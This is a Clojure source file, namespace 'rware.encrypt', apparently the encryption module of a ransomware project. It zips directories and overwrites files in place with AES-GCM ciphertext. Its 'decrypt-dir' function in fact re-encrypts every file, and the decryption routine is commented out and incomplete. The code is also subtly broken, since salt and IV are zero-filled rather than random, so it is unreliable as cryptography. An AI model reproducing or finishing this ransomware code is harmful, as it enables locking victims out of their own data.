(ns rware.encrypt
  (:require [rware.bytes :refer [b64->bytes bytes->b64]]
            [clojure.java.io :as io]
            [clojure.zip :as zip])
  (:import [javax.crypto Cipher KeyGenerator SecretKeyFactory]
           [javax.crypto.spec GCMParameterSpec IvParameterSpec SecretKeySpec PBEKeySpec]
           [java.security SecureRandom]
           [java.util.zip ZipEntry ZipOutputStream]))

(defn zip-dir
  [path]
  (let [zip-file (str path ".zip")]
    (with-open [zip (ZipOutputStream. (io/output-stream zip-file))]
      (doseq [f (file-seq (io/file path)) :when (.isFile f)]
        (.putNextEntry zip (ZipEntry. (.getPath f)))
        (io/copy f zip)
        (.closeEntry zip)))))

(defn derive-key
  [passphrase salt]
  (let [key-spec (PBEKeySpec. (.toCharArray passphrase) salt 65536 256)]
    (-> (SecretKeyFactory/getInstance "PBKDF2WithHmacSHA256")
        (.generateSecret key-spec)
        (.getEncoded))))

(defn generate-cipher
  [mode crypto-key salt iv]
  (let [key-spec (SecretKeySpec. (derive-key crypto-key salt) "AES")
        gcm-spec (GCMParameterSpec. 128 iv)
        cipher (Cipher/getInstance "AES/GCM/NoPadding")]
    (.init cipher mode key-spec gcm-spec)
    cipher))

(defn encrypt-file
  [path passphrase]
  (let [plain-text (slurp path)
        salt (byte-array 16)
        iv (byte-array 12)
        random (SecureRandom/getInstanceStrong)
        key (derive-key passphrase salt)
        gcm-spec (GCMParameterSpec. 128 iv)
        cipher (Cipher/getInstance "AES/GCM/NoPadding")]
    (.init cipher Cipher/ENCRYPT_MODE (SecretKeySpec. key "AES") gcm-spec)
    (let [encrypted-text (.doFinal cipher (.getBytes plain-text "UTF-8"))
          encrypted-data (concat salt iv encrypted-text)]
      (with-open [out (io/output-stream path)]
        (.write out (byte-array encrypted-data)))
      path)))

(defn encrypt-dir
  [dir-path crypto-key]
  (let [zipped-dir (zip-dir dir-path)]
    (encrypt-file zipped-dir crypto-key)))

(defn decrypt-dir
  [dir-path crypto-key]
  (doseq [file-contents (file-seq (io/file dir-path))
          :when (.exists (io/file file-contents))]
    (encrypt-file (.getPath file-contents) crypto-key)))

;(defn decrypt-file
;  [path crypto-key]
;  (let [file-contents (slurp path)
;        salt (subvec file-contents 0 16)
;        iv (subvec file-contents 16 28)
;        encrypted-text (subvec file-contents 28)
;        cipher (generate-cipher Cipher/DECRYPT_MODE crypto-key salt iv)
;        decrypted-text (.doFinal cipher encrypted-text)]
;    (String. decrypted-text)))
;(defn decrypt-file
;  [path crypto-key]
 ; (let [file-contents (slurp path)
  ;      cipher (generate-cipher Cipher/DECRYPT_MODE crypto-key)
   ;     decrypted-text ;(try 
    ;    (.doFinal cipher (.getBytes (String. file-contents) "UTF-8")) ;(catch Exception e nil))
;]
 ;   (String. decrypted-text)))
    ;(if (nil? decrypted-text)
     ; (println "Error decrypting file:" path)
      ;(-> path
       ;   (spit (String. decrypted-text))))))
